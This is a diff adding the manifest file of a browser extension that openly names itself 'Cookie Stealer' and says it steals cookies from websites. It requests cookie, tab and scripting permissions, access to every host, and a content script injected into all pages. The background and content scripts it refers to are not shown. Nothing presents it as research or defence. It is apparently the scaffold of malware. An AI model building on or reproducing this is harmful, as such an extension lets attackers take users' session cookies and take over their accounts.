@@ -1,0 +1,25 @@
+{
+  "manifest_version": 3,
+  "name": "Cookie Stealer",
+  "version": "1.0",
+  "description": "Steals cookies from websites.",
+  "permissions": [
+    "tabs",
+    "cookies",
+    "storage",
+    "scripting",
+      "activeTab"
+  ],
+  "host_permissions": [
+    "*://*/*"
+  ],
+    "background": {
+    "service_worker": "background.js"
+  },
+    "content_scripts":[
+        {
+          "matches": ["<all_urls>"],
+          "js": ["content.js"]
+          }
+    ]
+}
